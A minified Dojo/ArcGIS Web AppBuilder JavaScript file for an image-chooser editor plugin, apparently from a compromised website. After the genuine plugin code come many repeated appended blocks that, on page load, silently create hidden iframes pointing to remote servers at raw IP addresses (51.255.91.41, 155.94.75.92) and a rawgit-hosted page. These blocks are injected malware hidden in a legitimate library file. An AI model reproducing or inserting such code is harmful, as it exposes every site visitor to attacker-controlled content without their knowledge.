// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo dijit dijit/_editor/_Plugin jimu/dijit/ImageChooser dojo/_base/html dojo/_base/lang dojo/sniff dojo/i18n dojo/_base/connect dojo/_base/declare".split(" "),function(d,f,g,b,h,k,l,m){d.experimental("dojox.editor.plugins.ChooseImage");var e=d.declare("dojox.editor.plugins.ChooseImage",g,{iconClassPrefix:"editorIcon",useDefaultCommand:!1,_initButton:function(){this.createFileInput();this.command="chooseImage";var a=m.getLocalization("dijit._editor","commands");this.button=new f.form.Button({label:a.insertImage,
showLabel:!1,iconClass:this.iconClassPrefix+" "+this.iconClassPrefix+"UploadImage",tabIndex:"-1",onClick:k.hitch(this,this._chooseImage)});this.button.set("readOnly",!1);this.editor.commands[this.command]="Upload Image";this.inherited("_initButton",arguments);delete this.command},updateState:function(){var a=this.get("disabled");this.button.set("disabled",this.get("disabled"));!0===a?(h.addClass(this.button,"dijitButtonDisabled"),this.imageChooser.disableChooseImage()):(h.removeClass(this.button,
"dijitButtonDisabled"),this.imageChooser.enableChooseImage())},createFileInput:function(){var a=d.create("span",{innerHTML:"."},document.body);this.imageChooser=new b({showSelfImg:!1,cropImage:!1,format:[b.GIF,b.JPEG,b.PNG]},a);this.connect(this.imageChooser,"onImageChange","insertTempImage")},_chooseImage:function(){var a=this.imageChooser.mask;if(l("safari")){var c=document.createEvent("MouseEvents");c.initEvent("click",!0,!0);a.dispatchEvent(c)}else a.click()},onComplete:function(a){a=a[0];var c=
d.byId(this.currentImageId,this.editor.document),b;b=this.downloadPath?this.downloadPath+a.name:a.file;c.src=b;d.attr(c,"_djrealurl",b);a.width&&(c.width=a.width,c.height=a.height)},insertTempImage:function(a){this.currentImageId="img_"+(new Date).getTime();this.editor.execCommand("inserthtml",'\x3cimg id\x3d"'+this.currentImageId+'" src\x3d"'+a+'" /\x3e')},destroy:function(){this.imageChooser&&this.imageChooser.destroy();this.inherited(arguments)}});d.subscribe(f._scopeName+".Editor.getPlugin",null,
function(a){if(!a.plugin)switch(a.args.name){case "chooseImage":a.plugin=new e({url:a.args.url})}});g.registry.chooseImage=function(a){return new e(a)};return e});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});